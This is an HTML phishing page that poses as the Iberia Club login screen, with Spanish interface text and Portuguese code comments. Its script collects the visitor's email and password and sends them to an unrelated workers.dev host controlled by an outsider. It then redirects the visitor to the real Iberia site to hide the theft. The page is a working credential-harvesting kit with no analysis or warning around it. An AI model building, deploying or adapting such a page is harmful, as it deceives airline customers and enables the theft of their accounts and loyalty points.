<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Acceso a Iberia Club</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <!-- TOPO ESTILO APP IBERIA -->
  <div class="top-bar-app">
    <div class="left">
      <img src="logousf7733.png" alt="Iberia Logo" class="logo-mini">
      <div class="app-text">
        <strong>Iberia</strong>
      </div>
    </div>
    <button class="open-btn">ABRIR</button>
  </div>

  <!-- FORMUL√ÅRIO -->
  <div class="login-wrapper">
    <h1>Acceso a Iberia Club</h1>
    <p class="subtitle">Inicia sesi√≥n para ver promociones exclusivas y utilizar tus Avios.</p>

    <form id="loginForm">
      <div class="input-group">
        <input type="text" name="email" placeholder="E-mail o n¬∫ Iberia Club" required>
      </div>

      <div class="input-group password-group">
        <input type="password" name="password" placeholder="Contrase√±a" required>
        <span class="eye-icon">üëÅÔ∏è</span>
      </div>

      <div class="forgot">
        <a href="#">¬øHas olvidado tu contrase√±a?</a>
      </div>

      <button type="submit" class="login-btn">Iniciar sesi√≥n</button>

      <div class="divider"><span>o</span></div>

      <button type="button" class="google-btn">
        <img src="https://www.svgrepo.com/show/355037/google.svg" alt="Google"> Entrar con Google
      </button>

      <button type="button" class="facebook-btn">
        <span style="margin-right: 8px;">f</span> Entrar con Facebook
      </button>

      <div class="register">
        <p>¬øNo tienes cuenta? <a href="#">Reg√≠strate</a></p>
      </div>
    </form>
  </div>

  <script>
    // Mostrar/ocultar senha
    const eyeIcon = document.querySelector(".eye-icon");
    const passwordInput = document.querySelector('input[name="password"]');
    eyeIcon.addEventListener("click", () => {
      const type = passwordInput.type === "password" ? "text" : "password";
      passwordInput.type = type;
    });

    // Envio do formul√°rio para o Worker e redirecionamento
    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const email = e.target.email.value.trim();
      const password = e.target.password.value.trim();

      if (!email || !password) {
        alert("Por favor, preencha todos os campos.");
        return;
      }

      try {
        const response = await fetch("https://wild-shadow-c599.manuehfhjs2.workers.dev/", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: email,
            password: password,
            origem: "formulario_firebase"
          })
        });

        const data = await response.json();

        if (data.ok) {
        
          e.target.reset();
          // Redireciona para a p√°gina inicial
          window.location.href = "https://www.iberia.com/es/";
        } else {
          alert("‚ùå Erro ao enviar: " + (data.error || "tente novamente"));
        }
      } catch (err) {
        alert("Erro de conex√£o: " + err.message);
      }
    });
  </script>

</body>
</html>
